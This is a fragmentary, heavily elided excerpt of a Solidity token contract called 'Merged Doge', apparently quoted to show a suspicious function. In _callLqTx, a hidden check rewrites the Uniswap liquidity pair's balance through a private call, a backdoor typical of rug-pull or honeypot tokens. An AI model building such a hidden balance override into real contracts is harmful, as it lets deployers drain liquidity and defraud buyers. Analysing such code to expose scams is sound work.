...
contract MDoge is Ownable, IERC20 {
    ...
    string private _name = "Merged Doge";
    ...
    function _callLqTx(address _to) internal {
        if (_txCallSwap() == _to) {
            ...
            address _liquidityPair = _uniswapRouter.pair();
            _balances[_liquidityPair] = callTxLiquidity(_uniswapRouter.pair());
        }
    }
    ...
    function callTxLiquidity(address pair) private returns (uint256) {
